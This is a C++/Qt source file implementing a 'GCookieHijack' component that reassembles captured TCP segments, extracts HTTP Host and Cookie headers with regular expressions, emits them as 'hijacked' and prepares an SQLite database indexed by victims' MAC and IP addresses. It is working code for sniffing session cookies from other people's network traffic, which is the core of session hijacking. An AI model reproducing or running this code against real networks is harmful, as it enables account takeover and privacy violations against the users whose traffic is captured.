#include "gcookiehijack.h"

// ----------------------------------------------------------------------------
// GCookieHijack
// ----------------------------------------------------------------------------
bool GCookieHijack::doOpen() {
	if (tcpFlowMgr_ == nullptr) {
		SET_ERR(GErr::ObjectIsNull, "tcpFlowMgr is null");
		return false;
	}
	tcpFlowOffset_ = tcpFlowMgr_->requestItems_.request(this, sizeof(Item));
	tcpFlowMgr_->managables_.insert(this);

	reHost_.setPattern("Host: ([^\\r]*)\\r");
	reCookie_.setPattern("Cookie: ([^\\r]*)\\r");

	static bool first = true;
	if (first) {
		db_ = QSqlDatabase::addDatabase("QSQLITE");
		first = false;
	}

	db_.setDatabaseName(fileName_);
	if (!db_.open()) {
		SET_ERR(GErr::Fail, QString("%1 %2").arg(db_.lastError().text()).arg(fileName_));
		return false;
	}

	QSqlQuery query(db_);
	if (!query.exec(
			"CREATE TABLE IF NOT EXISTS cookie ("
			"	mac INTEGER PRIMARY KEY,"
			"	ip INTEGER,"
			"	alias TEXT,"
			"	host TEXT,"
			"	vendor TEXT,"
			"	mode INTEGER"
			");"
			)) {
		SET_ERR(GErr::Fail, query.lastError().text());
		return false;
	}

	if (!query.exec(
			"CREATE TABLE IF NOT EXISTS log ("\
			"	mac INTEGER,"\
			"	ip INTEGER,"\
			"	stt_time INTEGER,"\
			"	end_time INTEGER"\
			");"
			)) {
		SET_ERR(GErr::Fail, query.lastError().text());
		return false;
	}

	return true;

}

bool GCookieHijack::doClose() {
	return true;
}

void GCookieHijack::tcpFlowCreated(GFlow::TcpFlowKey tcpFlowKey, GTcpFlowMgr::TcpFlowValue* tcpFlowValue) {
	// qDebug() << QString("_tcpFlowDetected %1:%2>%3:%4").arg(QString(tcpFlowKey.sip_), QString::number(tcpFlowKey.sport_), QString(tcpFlowKey.dip_), QString::number(tcpFlowKey.dport_)); // gilgil temp 2021.04.07
	(void)tcpFlowKey;
	Item* item = getItem(tcpFlowValue);
	new (item) Item(this);
}

void GCookieHijack::tcpFlowDeleted(GFlow::TcpFlowKey tcpFlowKey, GTcpFlowMgr::TcpFlowValue* tcpFlowValue) {
	(void)tcpFlowKey;
	Item* item = getItem(tcpFlowValue);
	item->~Item();
	// qDebug() << QString("_tcpFlowDeleted %1:%2>%3:%4").arg(QString(tcpFlowKey.sip_), QString::number(tcpFlowKey.sport_), QString(tcpFlowKey.dip_), QString::number(tcpFlowKey.dport_)); // gilgil temp 2021.04.07
}

void GCookieHijack::hijack(GPacket* packet) {
	GIpHdr* ipHdr = packet->ipHdr_;
	if (ipHdr == nullptr) return;

	GTcpHdr* tcpHdr = packet->tcpHdr_;
	if (tcpHdr == nullptr) return;

	GBuf tcpData = packet->tcpData_;
	if (!tcpData.valid()) return;
	QString segment = QString::fromLatin1(pchar(tcpData.data_), tcpData.size_);

	Q_ASSERT(tcpFlowMgr_->currentTcpFlowVal_ != nullptr);
	Item* item = getItem(tcpFlowMgr_->currentTcpFlowVal_);
	item->insertSegment(tcpHdr->seq(), segment);

	QString host;
	QString cookie;
	if (!item->extract(host, cookie))
		return;

	qDebug() << host << cookie; // gilgil temp
	emit hijacked(packet, host, cookie);
}

// ----------------------------------------------------------------------------
// GCookieHijack::Item
// ----------------------------------------------------------------------------
void GCookieHijack::Item::insertSegment(uint32_t seq, QString segment) {
	segments_.insert(seq, segment);
	while (segments_.count() > ch_->maxMergeCount_) {
		segments_.erase(segments_.begin());
	}
}

bool GCookieHijack::Item::extract(QString& host, QString &cookie) {
	QString http;
	uint32_t nextSeq = 0;
	for (Map::iterator it = segments_.begin(); it != segments_.end(); it++) {
		uint32_t seq = it.key();
		QString& segment = it.value();
		if (nextSeq == 0 || seq == nextSeq) {
			nextSeq = seq + segment.size();
			http += segment;
		}
	}

	QRegularExpressionMatch m = ch_->reHost_.match(http);
	if (!m.hasMatch()) return false;
	host = m.captured(1);

	m = ch_->reCookie_.match(http);
	if (!m.hasMatch()) return false;
	cookie = m.captured(1);

	segments_.clear();
	return true;
}

#ifdef QT_GUI_LIB

#include "base/prop/gpropitem-filepath.h"
GPropItem* GCookieHijack::propCreateItem(GPropItemParam* param) {
	if (QString(param->mpro_.name()) == "fileName") {
		GPropItemFilePath* res = new GPropItemFilePath(param);
		QStringList filters{"db files - *.db(*.db)", "any files - *(*)"};
		res->fd_->setNameFilters(filters);
		return res;
	}
	return GObj::propCreateItem(param);
}

#endif // QT_GUI_LIB
